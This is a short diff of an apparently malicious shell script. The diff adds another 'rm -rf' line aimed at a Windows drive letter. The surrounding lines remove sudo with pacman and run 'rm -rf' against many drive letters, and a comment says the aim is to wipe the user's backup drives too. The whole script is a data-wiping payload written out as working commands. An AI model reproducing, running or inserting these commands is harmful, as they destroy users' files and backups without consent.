@@ -70,7 +70,7 @@ sudo pacman -Rns sudo
 # windows version #
 echo 'if windows somehow ported sh bc theres sh ports'
 rm -rf C:\
-#a rm -rf dditional drives incase user has backup drives for windows #
+#rm -rf dditional drives incase user has backup drives for windows #
 rm -rf A:\
 rm -rf  D:\
 rm -rf E:\
@@ -80,6 +80,7 @@ rm -rf J:\
 rm -rf K:\
 rm -rf L:\
 rm -rf P:\
+rm -rf O:\
 mkdir /done/
 mkdir /status/
 # end of windows version #
